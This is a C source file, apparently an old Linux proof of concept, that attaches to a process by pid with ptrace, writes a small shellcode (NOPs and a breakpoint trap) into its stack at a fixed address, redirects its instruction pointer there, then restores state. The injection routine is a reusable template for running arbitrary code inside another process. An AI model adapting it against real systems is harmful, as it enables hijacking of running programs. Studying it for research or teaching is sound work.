/* -scutstyle */

#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

void
hexdump (unsigned char *data, unsigned int amount);

unsigned char	shellcode[] = "\x90\x90\xcc\x73";

int
main (int argc, char *argv[])
{
	pid_t			cpid;
	struct user		regs;
	unsigned long int	safed_eip;
	unsigned long int	addr,
				addr_walker;
	unsigned char		data_saved[256];


#if 1
	if (argc != 2 || sscanf (argv[1], "%d", &cpid) != 1) {
		printf ("usage: %s <pid>\n", argv[0]);
		exit (EXIT_FAILURE);
	}
#else
	cpid = getppid();
#endif

	printf ("pid = %d\n", cpid);

	printf ("exploiting\n\n");

	if (ptrace (PTRACE_ATTACH, cpid, NULL, NULL) < 0) {
		perror ("ptrace");
		exit (EXIT_FAILURE);
	}

	/* save data */
	addr = 0xbffff010;
	for (addr_walker = 0 ; addr_walker < 256 ; ++addr_walker) {
		data_saved[addr_walker] = ptrace (PTRACE_PEEKDATA, cpid,
			addr + addr_walker, NULL);
	}
	hexdump (data_saved, sizeof (data_saved));

	/* write */
	for (addr_walker = 0 ; addr_walker < sizeof (shellcode) ;
		++addr_walker)
	{
		ptrace (PTRACE_POKEDATA, cpid, addr + addr_walker,
			shellcode[addr_walker] & 0xff);
	}

	/* redirect eip */
	memset (&regs, 0, sizeof (regs));
	if (ptrace (PTRACE_GETREGS, cpid, NULL, &regs) < 0) {
		perror ("ptrace PTRACE_GETREGS");
		exit (EXIT_FAILURE);
	}
	// write eip */
	safed_eip = regs.regs.eip;
	regs.regs.eip = 0xbffff010;
	if (ptrace (PTRACE_SETREGS, cpid, NULL, &regs) < 0) {
		perror ("ptrace PTRACE_GETREGS");
		exit (EXIT_FAILURE);
	}

	if (ptrace (PTRACE_CONT, cpid, NULL, NULL) < 0) {
		perror ("ptrace PTRACE_CONT");
		exit (EXIT_FAILURE);
	}

	wait (NULL);
	printf ("detrap\n");

	/* restore */
	for (addr_walker = 0 ; addr_walker < 256 ; ++addr_walker) {
		ptrace (PTRACE_POKEDATA, cpid, addr + addr_walker,
			data_saved[addr_walker] & 0xff);
	}

	/* restore regs */
	regs.regs.eip = safed_eip;
	if (ptrace (PTRACE_SETREGS, cpid, NULL, &regs) < 0) {
		perror ("ptrace PTRACE_GETREGS");
		exit (EXIT_FAILURE);
	}

	if (ptrace (PTRACE_DETACH, cpid, NULL, NULL) < 0) {
		perror ("ptrace PTRACE_DETACH");
		exit (EXIT_FAILURE);
	}

	exit (EXIT_SUCCESS);
}



void
hexdump (unsigned char *data, unsigned int amount)
{
	unsigned int	dp, p;	/* data pointer */
	const char	trans[] =
		"................................ !\"#$%&'()*+,-./0123456789"
		":;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklm"
		"nopqrstuvwxyz{|}~...................................."
		"....................................................."
		"........................................";

	for (dp = 1; dp <= amount; dp++) {
		printf ("%02x ", data[dp-1]);
		if ((dp % 8) == 0)
			printf (" ");
		if ((dp % 16) == 0) {
			printf ("| ");
			p = dp;
			for (dp -= 16; dp < p; dp++)
				printf ("%c", trans[data[dp]]);
			printf ("\n");
		}
	}
	if ((amount % 16) != 0) {
		p = dp = 16 - (amount % 16);
		for (dp = p; dp > 0; dp--) {
			printf ("   ");
			if (((dp % 8) == 0) && (p != 8))
				printf (" ");
		}
		printf (" | ");
		for (dp = (amount - (16 - p)); dp < amount; dp++)
			printf ("%c", trans[data[dp]]);
	}
	printf ("\n");

	return;
}
